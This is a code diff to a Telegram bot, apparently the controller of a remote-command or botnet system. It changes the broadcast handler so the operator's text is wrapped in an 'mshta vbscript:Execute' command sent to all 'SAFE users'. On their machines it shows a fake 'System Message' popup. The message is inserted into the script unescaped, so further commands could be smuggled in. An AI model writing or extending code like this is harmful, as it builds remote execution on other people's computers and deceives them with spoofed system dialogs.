@@ -305,8 +305,10 @@ async def handle_search(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(search_user_sync(update.message.text), parse_mode="Markdown"); return await start(update, context)
 
 async def handle_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    count = broadcast_update_sync(update.message.text)
-    await update.message.reply_text(f"📢 Sent to {count} SAFE users."); return await start(update, context)
+    msg_text = update.message.text.strip()
+    vbs = f'mshta vbscript:Execute("msgbox ""{msg_text}"",64,""System Message"":close")'
+    count = broadcast_update_sync(vbs)
+    await update.message.reply_text(f"📢 Popup broadcast sent to {count} SAFE users."); return await start(update, context)
 
 async def handle_rename_old(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["rename_old"] = update.message.text.strip()
